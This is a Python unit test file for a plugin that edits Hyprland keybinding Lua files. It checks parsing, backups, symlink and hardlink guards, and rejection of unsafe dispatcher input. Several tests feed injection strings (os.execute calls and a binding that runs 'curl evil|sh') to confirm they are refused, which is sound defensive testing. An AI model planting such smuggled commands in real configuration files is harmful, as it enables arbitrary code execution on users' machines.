        self.assertEqual(keys, ["SUPER + X", "SUPER + Y"])
        keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + X"])
        content = self._read()
        self.assertNotIn("SUPER + X", content)
        self.assertIn('o.bind("SUPER + Y", "Y", "keep")', content)

    def test_description_whitespace_preserved(self):
        self._write('o.bind("SUPER + W", "Close  Window", "cmd  x")\n')
        binds = keybinds_manager.parse_user_bindings()["binds"]
        self.assertEqual(binds[0]["description"], "Close  Window")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + N", "description": "N", "command": "true"}])
        self.assertIn('o.bind("SUPER + W", "Close  Window", "cmd  x")', self._read())

    def test_description_with_quotes_roundtrip(self):
        # Descriptions the plugin itself writes must stay parseable: the old
        # [^"']+ header regex hid every binding whose description had a quote.
        desc = 'Bob\'s "Editor"'
        self._write("-- original\n")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + B", "description": desc,
                           "command": "bobs"}],
            unbinds_to_add=["SUPER + B"])
        binds = keybinds_manager.parse_user_bindings()["binds"]
        self.assertEqual([b["description"] for b in binds], [desc])
        self.assertEqual(keybinds_manager._written_bind_identity(
            {"key": "SUPER + B", "description": desc, "command": "bobs"})[0], desc)

    # -- backup safety net ---------------------------------------------------

    def test_backup_matches_previous_content(self):
        first = '-- original\nhl.unbind("SUPER + A")\n'
        self._write(first)
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + B", "description": "B", "command": "true"}])
        self.assertEqual(self._read_backup(), first)
        second = self._read()
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + C", "description": "C", "command": "true"}])
        self.assertEqual(self._read_backup(), second)

    # -- statement-aware editing --------------------------------------------

    def test_multiline_statement_replaced_as_a_whole(self):
        self._write('o.bind("SUPER + W", "Close Window",\n'
                    '  "hyprctl dispatch killactive")\n')
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + W", "description": "Close Window",
                           "command": "hyprctl dispatch closewindow"}],
            keys_to_remove=["SUPER + W"])
        content = self._read()
        self.assertNotIn('"hyprctl dispatch killactive")', content)
        self.assertIn(
            'o.bind("SUPER + W", "Close Window", "hyprctl dispatch closewindow")',
            content)
        self.assertEqual(len(keybinds_manager.parse_user_bindings()["binds"]), 1)

    def test_block_comment_bindings_are_inert_and_preserved(self):
        commented = ('--[[\nhl.unbind("SUPER + W")\n'
                     'o.bind("SUPER + Q", "Q", "q")\n]]\n')
        self._write(commented)
        parsed = keybinds_manager.parse_user_bindings()
        self.assertEqual(parsed["unbinds"], set())
        self.assertEqual(parsed["binds"], [])
        keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + W", "SUPER + Q"])
        self.assertIn(commented.strip(), self._read())

    def _stub_set_keybinding(self):
        """Keep set_keybinding off /usr/share and hyprctl."""
        self._orig_defaults = keybinds_manager.parse_default_bindings
        self._orig_reload = keybinds_manager.reload_hyprland
        keybinds_manager.parse_default_bindings = lambda: []
        keybinds_manager.reload_hyprland = lambda: {
            "success": True, "reload_output": "", "config_errors": ""}

    def _unstub_set_keybinding(self):
        keybinds_manager.parse_default_bindings = self._orig_defaults
        keybinds_manager.reload_hyprland = self._orig_reload

    def test_in_place_edit_keeps_second_binding_on_same_chord(self):
        # Editing one of two user bindings that share a chord must not delete
        # the other one (the old key-in-lines_to_add clause did). The row being
        # edited is identified by its previous description/command, because the
        # chord alone matches both.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Close", "a2", "", "SUPER + K",
                old_description="Close", old_command="a")
            content = self._read()
            self.assertIn('o.bind("SUPER + K", "Exec", "b")', content)
            self.assertIn('o.bind("SUPER + K", "Close", "a2")', content)
            self.assertEqual(content.count("o.bind("), 2)
        finally:
            self._unstub_set_keybinding()

    def test_new_binding_overrides_occupied_chord(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n')
            keybinds_manager.set_keybinding("SUPER + K", "Mine", "mine", "", "")
            content = self._read()
            self.assertNotIn('"Close"', content)
            self.assertIn('o.bind("SUPER + K", "Mine", "mine")', content)
        finally:
            self._unstub_set_keybinding()

    def test_in_place_rename_replaces_single_line(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Old name", "old")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "New name", "new", "", "SUPER + K")
            content = self._read()
            self.assertNotIn('"Old name"', content)
            self.assertIn('o.bind("SUPER + K", "New name", "new")', content)
        finally:
            self._unstub_set_keybinding()

    def test_dispatcher_looking_command_is_rejected(self):
        self._write("-- original\n")
        res = keybinds_manager.set_keybinding("SUPER + R", "Reload", "hl.dsp.reload()", "")
        self.assertFalse(res["success"])
        self.assertIn("dispatcher", res["error"])
        self.assertEqual(self._read(), "-- original\n")

    def test_quoted_action_is_stable_across_saves(self):
        self._write('o.bind("SUPER + Q", "Q", "echo \\"hi\\"")\n')
        for _ in range(2):
            bind = keybinds_manager.parse_user_bindings()["binds"][0]
            keybinds_manager.write_user_bindings(
                lines_to_add=[{"key": bind["key"],
                               "description": bind["description"],
                               "command": bind.get("command") or bind["action"],
                               "action": bind["action"]}],
                keys_to_remove=[bind["key"]])
        self.assertIn('o.bind("SUPER + Q", "Q", "echo \\"hi\\"")', self._read())

    def test_crlf_line_endings_preserved(self):
        with open(self.path, "wb") as f:
            f.write(b'o.bind("SUPER + Z", "Z", "z")\r\n-- comment\r\n')
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + N", "description": "N", "command": "n"}])
        with open(self.path, "rb") as f:
            data = f.read()
        self.assertIn(b'-- comment\r\n', data)
        self.assertIn(b'o.bind("SUPER + N", "N", "n")\r\n', data)
        self.assertNotIn(b"\n", data.replace(b"\r\n", b""))

    # -- bounded reads -------------------------------------------------------

    def test_get_installed_apps_skips_oversized_and_special_files(self):
        app_dir = tempfile.mkdtemp(dir=self._tmpdir.name)
        with open(os.path.join(app_dir, "good.desktop"), "w", encoding="utf-8") as f:
            f.write("[Desktop Entry]\nType=Application\nName=Good\nExec=good --run\n")
        with open(os.path.join(app_dir, "big.desktop"), "w", encoding="utf-8") as f:
            f.write("[Desktop Entry]\nType=Application\nName=Big\nExec=big\nComment=")
            f.write("a" * (keybinds_manager.MAX_FILE_BYTES + 1))
        os.mkfifo(os.path.join(app_dir, "fifo.desktop"))
        apps = keybinds_manager.get_installed_apps(dirs=[app_dir])
        self.assertEqual([a["name"] for a in apps], ["Good"], apps)

    def test_fifo_bindings_do_not_block_and_are_refused_for_writing(self):
        os.mkfifo(self.path)
        # Everything that opens the FIFO runs in a worker: with O_NONBLOCK
        # dropped the open blocks forever, so the join deadline turns a hung
        # test run into a fast, named failure.
        result = {}

        def read_fifo():
            # Non-regular targets must be refused by the reader itself, not
            # merely skipped because an empty FIFO happens to read as "".
            result["reader"] = keybinds_manager._read_bounded_regular_file(self.path)
            result["parsed"] = keybinds_manager.parse_user_bindings()

        worker = threading.Thread(target=read_fifo, daemon=True)
        worker.start()
        worker.join(5)
        self.assertFalse(worker.is_alive(), "reading a FIFO blocked the reader")
        self.assertIsNone(result["reader"])
        self.assertEqual(result["parsed"]["binds"], [])
        self.assertEqual(result["parsed"]["unbinds"], set())
        with self.assertRaises(ValueError):
            keybinds_manager.write_user_bindings(unbinds_to_add=["SUPER + Z"])

    def test_installed_apps_scan_caps_are_enforced(self):
        app_dir = tempfile.mkdtemp(dir=self._tmpdir.name)
        for name in ("One", "Two", "Three"):
            with open(os.path.join(app_dir, name.lower() + ".desktop"), "w",
                      encoding="utf-8") as f:
                f.write("[Desktop Entry]\nType=Application\n"
                        f"Name={name}\nExec={name.lower()}\n")
        saved_files = keybinds_manager.MAX_APP_FILES
        saved_bytes = keybinds_manager.MAX_APP_TOTAL_READ
        try:
            keybinds_manager.MAX_APP_FILES = 2
            self.assertEqual(
                len(keybinds_manager.get_installed_apps(dirs=[app_dir])), 2)
            keybinds_manager.MAX_APP_FILES = saved_files
            keybinds_manager.MAX_APP_TOTAL_READ = 10
            self.assertEqual(
                len(keybinds_manager.get_installed_apps(dirs=[app_dir])), 1)
        finally:
            keybinds_manager.MAX_APP_FILES = saved_files
            keybinds_manager.MAX_APP_TOTAL_READ = saved_bytes

    def test_written_identity_treats_command_as_literal(self):
        # Half of the raw-vs-literal rule lives in the identity helper: a
        # command that looks like a dispatcher must still be quoted there.
        _desc, action = keybinds_manager._written_bind_identity(
            {"key": "SUPER + X", "description": "d",
             "command": "hl.dsp.window.close()"})
        # Identity compares VALUES now: the literal form on disk is free (a quoted
        # command, a [[...]] action, an escape) and re-encoding it is what broke
        # untouched saves.
        self.assertEqual(action, "hl.dsp.window.close()")
        _desc, raw = keybinds_manager._written_bind_identity(
            {"key": "SUPER + X", "description": "d", "command": "",
             "action": "hl.dsp.window.close()"})
        self.assertEqual(raw, "hl.dsp.window.close()")

    # -- in-place edits when several bindings share a chord ------------------

    def test_in_place_rename_replaces_only_the_edited_binding(self):
        # A rename changes both the description and the command, so the key can
        # no longer identify the line: the previous identity must. Before this
        # the old line survived and every save added one more.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K",
                old_description="Exec", old_command="b")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertIn('o.bind("SUPER + K", "Close", "a")', content)
            self.assertIn('o.bind("SUPER + K", "Exec v2", "kitty")', content)
            self.assertNotIn('"Exec", "b"', content)
            self.assertEqual(content.count("o.bind("), 2)
        finally:
            self._unstub_set_keybinding()

    def test_in_place_rename_refuses_when_chord_is_ambiguous(self):
        self._stub_set_keybinding()
        try:
            original = ('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            self._write(original)
            res = keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K")
            self.assertFalse(res["success"])
            self.assertIn("share this chord", res["error"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_no_unbind_is_added_when_a_sibling_binding_is_preserved(self):
        # hl.unbind(<chord>) removes every binding on that chord at the
        # Hyprland level, so emitting it unconditionally made the panel show a
        # sibling that no longer existed.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K",
                old_description="Exec", old_command="b")
            self.assertNotIn("hl.unbind", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_unbind_for_a_default_chord_precedes_every_user_bind(self):
        # When the chord is an Omarchy default the unbind is still needed, but it
        # must come first: Hyprland removes every bind registered before it, and
        # the user file loads after the defaults, so a trailing unbind would kill
        # the sibling binding kept above it.
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + K", "description": "Default", "action": "default"}]
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K",
                old_description="Exec", old_command="b")
            lines = self._read().splitlines()
            unbind_at = lines.index('hl.unbind("SUPER + K")')
            binds_at = [i for i, l in enumerate(lines) if l.startswith("o.bind(")]
            self.assertEqual(len(binds_at), 2)
            self.assertLess(unbind_at, min(binds_at))
        finally:
            self._unstub_set_keybinding()

    # -- the writer proves the change landed ---------------------------------

    def test_edit_refuses_when_the_statement_cannot_be_isolated(self):
        # An unbalanced bracket above the binds collapses every following line
        # into one unit; the old writer wrote the file back unchanged and the
        # CLI still reported success.
        self._stub_set_keybinding()
        try:
            original = ('local x = foo(\n'
                        'o.bind("SUPER + 1", "One", "one")\n'
                        'o.bind("SUPER + 2", "Two", "two")\n')
            self._write(original)
            res = keybinds_manager.set_keybinding(
                "SUPER + 2", "Two v2", "two2", "", "SUPER + 2")
            self.assertFalse(res["success"])
            self.assertIn("nothing was written", res["error"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    # -- raw dispatcher validation ------------------------------------------

    def test_raw_dispatcher_rejects_newline_and_second_statement(self):
        for bad in ('hl.dsp.window.close())\nos.execute("touch /tmp/x") --',
                    'hl.dsp.window.close(); os.execute("touch /tmp/x")',
                    'hl.dsp.focus({ direction = "left"',):
            self.assertFalse(keybinds_manager._lua_single_expression_problem(bad) == "",
                             f"accepted a bad dispatcher: {bad!r}")
        for good in ('hl.dsp.window.close()',
                     'hl.dsp.window.move({ workspace = "e+1", follow = false })',
                     '{ "a", "b" }'):
            self.assertEqual(keybinds_manager._lua_single_expression_problem(good), "",
                             f"refused a valid dispatcher: {good!r}")

    def test_raw_dispatcher_with_second_statement_is_refused_by_the_writer(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + 1", "One", "one")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + 2", "Two", "", 'hl.dsp.window.close()\nos.execute("id") --')
            self.assertFalse(res["success"])
            self.assertNotIn("os.execute", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_invalid_key_is_refused_by_every_verb(self):
        for verb in (keybinds_manager.disable_keybinding,
                     keybinds_manager.enable_keybinding,
                     keybinds_manager.reset_keybinding):
            res = verb('SUPER + A")')
            self.assertFalse(res["success"], f"{verb.__name__} accepted an unsafe key")
        self.assertFalse(os.path.exists(self.path) and "hl.unbind(\"\")" in self._read())

    # -- guards that must fail when deleted ---------------------------------

    def test_dangling_symlink_at_bindings_path_is_refused(self):
        # Deleting this guard made the plugin create the link target's
        # directory and write outside ~/.config; the suite stayed green.
        outside = os.path.join(self._tmpdir.name, "created-by-plugin", "bindings.lua")
        os.unlink(self.path) if os.path.exists(self.path) else None
        os.symlink(outside, self.path)
        with self.assertRaises(ValueError):
            keybinds_manager.write_user_bindings(
                lines_to_add=[{"key": "SUPER + B", "description": "B", "command": "true"}])
        self.assertFalse(os.path.exists(outside))

    def test_backup_does_not_truncate_a_planted_hardlink(self):
        self._write('o.bind("SUPER + 1", "One", "one")\n')
        victim = os.path.join(self._tmpdir.name, "victim.txt")
        with open(victim, "w", encoding="utf-8") as f:
            f.write("do not touch\n")
        os.link(victim, self.path + ".bak")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + 2", "description": "Two", "command": "two"}])
        with open(victim, "r", encoding="utf-8") as f:
            self.assertEqual(f.read(), "do not touch\n")
        self.assertEqual(self._read_backup(), 'o.bind("SUPER + 1", "One", "one")\n')

    # -- round-2 review: the dispatcher check, unbind placement, identity -----

    def test_dispatcher_rejects_a_line_comment_tail(self):
        # `hl.foo() --` comments out the closing paren of the generated o.bind,
        # so bindings.lua stops compiling and Hyprland drops every user binding.
        self.assertTrue(keybinds_manager._lua_single_expression_problem("hl.dsp.window.close() --"))
        self.assertTrue(keybinds_manager._lua_single_expression_problem("hl.dsp.exec(\"a\") -- c"))
        self.assertTrue(keybinds_manager._lua_single_expression_problem("--[["))

    def test_dispatcher_rejects_trailing_escape_and_top_level_comma(self):
        self.assertTrue(keybinds_manager._lua_single_expression_problem("hl.foo() \\"))
        # A depth-0 comma becomes o.bind's fourth argument and is evaluated at
        # load time: a second expression smuggled into the file Hyprland runs.
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.window.close(), os.execute("/usr/bin/true")'))
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.window.close() or o.bind("SUPER + X", "pwned", "evil")'))

    def test_dispatcher_rejects_an_over_long_expression(self):
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            'hl.foo("' + "A" * (keybinds_manager.MAX_CMD_LEN + 10) + '")'))
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            'hl.foo("' + "A" * 100 + '")'), "")

    def test_dispatcher_accepts_omarchy_helper_calls_and_long_strings(self):
        # Omarchy's own defaults bind helpers like o.launch_terminal(): they are
        # code, and editing such a binding must not turn them into a string.
        self.assertTrue(keybinds_manager._is_raw_dispatcher("o.launch_terminal()"))
        self.assertEqual(keybinds_manager._lua_single_expression_problem("o.launch_terminal()"), "")
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.exec([==[echo "a;b" --x]==])'), "")
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.window.move({ workspace = "e+1", follow = false })'), "")

    def test_dispatcher_looking_command_is_refused_not_written_as_code(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + 1", "One", "one")\n')
            for text in ("o.launch_terminal()", "hl.dsp.window.close()", "{ a; b; }"):
                res = keybinds_manager.set_keybinding("SUPER + 2", "Two", text)
                self.assertFalse(res["success"], text)
            self.assertNotIn("launch_terminal", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_unbind_is_not_placed_inside_a_leading_block_comment(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + W", "description": "Close", "action": "o.close()"}]
            self._write('--[[\nlegacy notes\n-- kept\n]]\no.bind("SUPER + W", "Close", "a")\n')
            keybinds_manager.set_keybinding("SUPER + W", "Close v2", "b")
            content = self._read()
            block = content.split("]]")[0]
            self.assertNotIn("hl.unbind", block)
            self.assertIn('hl.unbind("SUPER + W")', content)
            parsed = keybinds_manager.parse_user_bindings()
            self.assertIn("SUPER + W", parsed["unbinds"])
        finally:
            self._unstub_set_keybinding()

    def test_rename_onto_the_sibling_description_keeps_the_sibling(self):
        # Identity matching on description OR action deleted a sibling that only
        # shared one half with the row being edited.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Exec", "kitty", "", "SUPER + K",
                old_description="Close", old_command="a")
            content = self._read()
            self.assertIn('o.bind("SUPER + K", "Exec", "b")', content)
            self.assertIn('o.bind("SUPER + K", "Exec", "kitty")', content)
            self.assertNotIn('o.bind("SUPER + K", "Close", "a")', content)
        finally:
            self._unstub_set_keybinding()

    def test_reset_reports_the_write_separately_from_the_reload(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.reload_hyprland = lambda: {"success": False, "error": "no session"}
            self._write('o.bind("SUPER + 1", "One", "one")\n')
            res = keybinds_manager.reset_keybinding("SUPER + 1")
            self.assertTrue(res["success"], res)
            self.assertFalse(res["reload_success"])
            self.assertNotIn("o.bind(", self._read())
        finally:
            self._unstub_set_keybinding()

    # -- round-3 review: statements, identities, BOM, control bytes -----------

    def test_rename_of_a_helper_call_with_a_quoted_argument_replaces_it(self):
        # The identity helper classed o.<name>(...) as a command string while the
        # writer emitted it as code, so the old line never matched and every save
        # appended another copy.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + M", "Move left", o.workspaces.move_to_monitor("l"))\n'
                        'o.bind("SUPER + M", "Other", "other")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + M", "Move left v2", "", 'o.workspaces.move_to_monitor("l")',
                "SUPER + M", old_description="Move left",
                old_action='o.workspaces.move_to_monitor("l")')
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertEqual(content.count('o.workspaces.move_to_monitor("l")'), 1)
            self.assertIn('o.bind("SUPER + M", "Move left v2"', content)
            self.assertIn('o.bind("SUPER + M", "Other", "other")', content)
        finally:
            self._unstub_set_keybinding()

    def test_chord_change_requires_the_previous_identity(self):
        self._stub_set_keybinding()
        try:
            original = 'o.bind("SUPER + K", "Close", "a")\n'
            self._write(original)
            res = keybinds_manager.set_keybinding(
                "SUPER + J", "Close", "a", "", "SUPER + K")
            self.assertFalse(res["success"])
            self.assertIn("previous description", res["error"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_chord_change_with_identity_moves_the_binding(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + L", "Close", "a", "", "SUPER + K",
                old_description="Close", old_command="a")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertNotIn('o.bind("SUPER + K", "Close", "a")', content)
            self.assertIn('o.bind("SUPER + K", "Exec", "b")', content)
            self.assertIn('o.bind("SUPER + L", "Close", "a")', content)
        finally:
            self._unstub_set_keybinding()

    def test_line_with_a_second_statement_is_refused_not_deleted(self):
        # The unit scanner groups by physical lines: dropping such a unit took the
        # neighbouring statement with it and left bindings.lua uncompilable.
        self._stub_set_keybinding()
        try:
            original = ('o.bind("SUPER + RETURN", "Terminal", "y"); if true then\n'
                        '  local q = 1\n'
                        'end\n')
            self._write(original)
            res = keybinds_manager.disable_keybinding("SUPER + RETURN")
            self.assertFalse(res["success"])
            self.assertIn("another statement", res["error"])
            self.assertEqual(self._read(), original)
            res = keybinds_manager.set_keybinding(
                "SUPER + RETURN", "Terminal v2", "y2", "", "SUPER + RETURN",
                old_description="Terminal", old_command="y")
            self.assertFalse(res["success"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_leading_bom_stays_at_offset_zero(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + W", "description": "Close", "action": "o.close()"}]
            self._write('\ufeff-- head\no.bind("SUPER + W", "Close", "a")\n')
            res = keybinds_manager.set_keybinding("SUPER + W", "Close v2", "b")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertTrue(content.startswith("\ufeff"), repr(content[:20]))
            self.assertEqual(content.count("\ufeff"), 1)
            self.assertIn('hl.unbind("SUPER + W")', content)
        finally:
            self._unstub_set_keybinding()

    def test_control_bytes_never_reach_the_lua_literal(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + N", "Note\x00", "notify-send a\x01b")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertNotIn("\x00", content)
            self.assertNotIn("\x01", content)
        finally:
            self._unstub_set_keybinding()

    # -- round-4 review: quoted commands, nil rows, blind spots ---------------

    def test_quoted_command_round_trips_through_the_model(self):
        # The model hands the editor a DECODED command, so an untouched save is
        # byte-stable; unescaping in the dialog escaped it again every save.
        self._stub_set_keybinding()
        try:
            original = 'o.bind("SUPER + H", "Say Hi", "echo \\"hi\\"")\n'
            self._write(original)
            row = keybinds_manager.parse_user_bindings()["binds"][0]
            self.assertEqual(row["command"], 'echo "hi"')
            res = keybinds_manager.set_keybinding(
                "SUPER + H", row["description"], row["command"], "", "SUPER + H",
                old_description=row["description_raw"], old_command="", old_action="")
            self.assertTrue(res["success"], res)
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_nil_description_row_is_replaced_not_duplicated(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + E", nil, "edcmd")\n')
            row = keybinds_manager.parse_user_bindings()["binds"][0]
            self.assertEqual(row["description_raw"], "")
            res = keybinds_manager.set_keybinding(
                "SUPER + E", "Renamed", "edcmd", "", "SUPER + E",
                old_description=row["description_raw"], old_command="edcmd")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertEqual(content.count("o.bind("), 1)
            self.assertIn('o.bind("SUPER + E", "Renamed", "edcmd")', content)
        finally:
            self._unstub_set_keybinding()

    def test_bind_not_at_the_start_of_its_line_is_refused_not_ignored(self):
        self._stub_set_keybinding()
        try:
            original = ('if true then o.bind("SUPER + C", "gamma", "c") end\n'
                        'o.bind("SUPER + B", "beta", "b")\n')
            self._write(original)
            res = keybinds_manager.disable_keybinding("SUPER + C")
            self.assertFalse(res["success"], res)
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_case_only_rename_is_a_legal_edit(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Exec", "b")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + K", "exec", "b", "", "SUPER + K",
                old_description="Exec", old_command="b")
            self.assertTrue(res["success"], res)
            self.assertIn('o.bind("SUPER + K", "exec", "b")', self._read())
        finally:
            self._unstub_set_keybinding()

    def test_enable_refuses_when_the_unbind_cannot_be_removed(self):
        self._stub_set_keybinding()
        try:
            original = 'hl["unbind"]("SUPER + X")\n'
            self._write(original)
            res = keybinds_manager.enable_keybinding("SUPER + X")
            self.assertFalse(res["success"], res)
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_a_dispatcher_may_not_register_another_binding(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + F7", "d", "", 'o.bind("SUPER + F9", "injected", "curl evil|sh")')
            self.assertFalse(res["success"])
            self.assertIn("may not register another binding", res["error"])
            self.assertNotIn("SUPER + F9", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_a_refused_edit_keeps_the_previous_backup(self):
        self._stub_set_keybinding()
        try:
            with open(self.path + ".bak", "w", encoding="utf-8") as f:
                f.write("-- PREVIOUS KNOWN-GOOD BACKUP\n")
            self._write('o.bind("SUPER + RETURN", "T", "y"); if true then\nend\n')
            res = keybinds_manager.disable_keybinding("SUPER + RETURN")
            self.assertFalse(res["success"])
            self.assertEqual(self._read_backup(), "-- PREVIOUS KNOWN-GOOD BACKUP\n")
        finally:
            self._unstub_set_keybinding()

    def test_undecodable_default_bindings_file_is_skipped(self):
        # A latin-1 file in the defaults dir used to abort the whole model build.
        import tempfile as _tf
        with _tf.TemporaryDirectory() as d:
            with open(os.path.join(d, "ok.lua"), "w", encoding="utf-8") as f:
                f.write('o.bind("SUPER + J", "Jump", "j")\n')
            with open(os.path.join(d, "bad.lua"), "wb") as f:
                f.write(b'o.bind("SUPER + K", "K\xe9", "k")\n')
            saved = keybinds_manager.DEFAULT_BINDINGS_DIR
            keybinds_manager.DEFAULT_BINDINGS_DIR = d
            try:
                binds = keybinds_manager.parse_default_bindings()
            finally:
                keybinds_manager.DEFAULT_BINDINGS_DIR = saved
        self.assertTrue(any(b["key"] == "SUPER + J" for b in binds))

    # -- round-5 review: literal forms, duplication proof, model honesty --------

    def _save_untouched(self, line):
        self._stub_set_keybinding()
        try:
            self._write(line + "\n")
            row = keybinds_manager.parse_user_bindings()["binds"][0]
            res = keybinds_manager.set_keybinding(
                row["key"], row["description"], row["command"], "", row["key"],
                old_description=row.get("description_raw", ""),
                old_command=row["command"], old_action=row["action"])
            return res, self._read()
        finally:
            self._unstub_set_keybinding()

    def test_wholly_quoted_command_survives_an_untouched_save(self):
        line = r'o.bind("SUPER + R", "Run", "\"$HOME/My App/run\"")'
        res, content = self._save_untouched(line)
        self.assertTrue(res["success"], res)
        self.assertEqual(content, line + "\n")

    def test_long_bracket_action_survives_an_untouched_save(self):
        line = 'o.bind("SUPER + K", "K", [[echo "hi" ]])'
        res, content = self._save_untouched(line)
        self.assertTrue(res["success"], res)
        self.assertEqual(content, line + "\n")

    def test_escape_sequences_survive_an_untouched_save(self):
        line = r'o.bind("SUPER + T", "T", "printf \"a\nb\"")'
        res, content = self._save_untouched(line)
        self.assertTrue(res["success"], res)
        self.assertEqual(content, line + "\n")

    def test_over_long_description_is_refused_not_truncated(self):
        long_desc = "L" * 260
        res, content = self._save_untouched(f'o.bind("SUPER + B", "{long_desc}", "b")')
        # Truncating on the way to disk rewrote the user's row to 200 characters
        # while reporting success; the refusal names the field.
        self.assertFalse(res["success"])
        self.assertIn("description is longer", res["error"])
        self.assertEqual(content.count("o.bind("), 1)

    def test_long_bracket_key_is_removed_by_disable(self):
        self._stub_set_keybinding()
        try:
            self._write('-- mine\no.bind([[SUPER + W]], "Close", "killactive")\n')
            res = keybinds_manager.disable_keybinding("SUPER + W")
            self.assertTrue(res["success"], res)
            self.assertNotIn("o.bind(", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_a_commented_unbind_does_not_veto_the_real_one(self):
        self._stub_set_keybinding()
        try:
            self._write('--[[\nhl.unbind("SUPER + W")\n]]\n')
            res = keybinds_manager.disable_keybinding("SUPER + W")
            self.assertTrue(res["success"], res)
            units = [t for _u, t, c in keybinds_manager._lua_units(
                keybinds_manager._split_lines(self._read())[0]) if t and not c]
            self.assertTrue(any(u.strip().startswith("hl.unbind") for u in units), units)
        finally:
            self._unstub_set_keybinding()

    def test_a_second_chord_keeps_the_default_row(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + W", "description": "Close Window", "action": "killactive"}]
            self._write('o.bind("SUPER + SHIFT + Q", "Close Window", "killactive")\n')
            model = keybinds_manager.build_complete_model()
            keys = {b["key"] for b in model["active"]}
            self.assertIn("SUPER + W", keys)
        finally:
            self._unstub_set_keybinding()

    def test_a_chord_without_a_keysym_is_refused(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            for chord in ("SUPER", "SUPER + CTRL"):
                res = keybinds_manager.set_keybinding(chord, "d", "true")
                self.assertFalse(res["success"], (chord, res))
            self.assertEqual(self._read(), "")
        finally:
            self._unstub_set_keybinding()

    def test_a_nested_binding_in_a_table_is_refused(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + Y", "d", "", '{ o.bind("SUPER + Z", "z", "c") }')
            self.assertFalse(res["success"])
            self.assertIn("may not register another binding", res["error"])
        finally:
            self._unstub_set_keybinding()

    def test_a_rejected_file_is_not_reported_as_applied(self):
